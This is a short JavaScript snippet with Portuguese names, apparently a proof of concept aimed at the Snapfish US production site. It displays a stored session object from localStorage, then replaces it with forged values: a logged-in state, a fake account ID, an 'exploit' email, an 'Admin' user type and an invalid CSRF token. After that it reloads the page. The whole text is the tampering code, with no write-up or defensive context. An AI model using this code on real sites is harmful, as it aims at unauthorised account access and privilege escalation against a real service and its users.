const storageKey = 'production_snapfish_snapfish_us_userData';
    
    
    function exibirSessao() {
      const dados = localStorage.getItem(storageKey);
      document.getElementById('sessionData').textContent = dados ? dados : 'Nenhum dado encontrado.';
    }
    
    exibirSessao();

    
    function alterarSessao() {
      
      let sessionData = {
        isUserLoggedIn: "true",          
        acctId: "999999999",             
        emailAddress: "exploit@exemplo.com",
        userType: "Admin",               
        securityCSRFToken: "token_invalido",
        loginState: "YES"
      };

      
      localStorage.setItem(storageKey, JSON.stringify(sessionData));
      
      
      exibirSessao();

      
      setTimeout(() => {
        location.reload();
      }, 2000);
    }
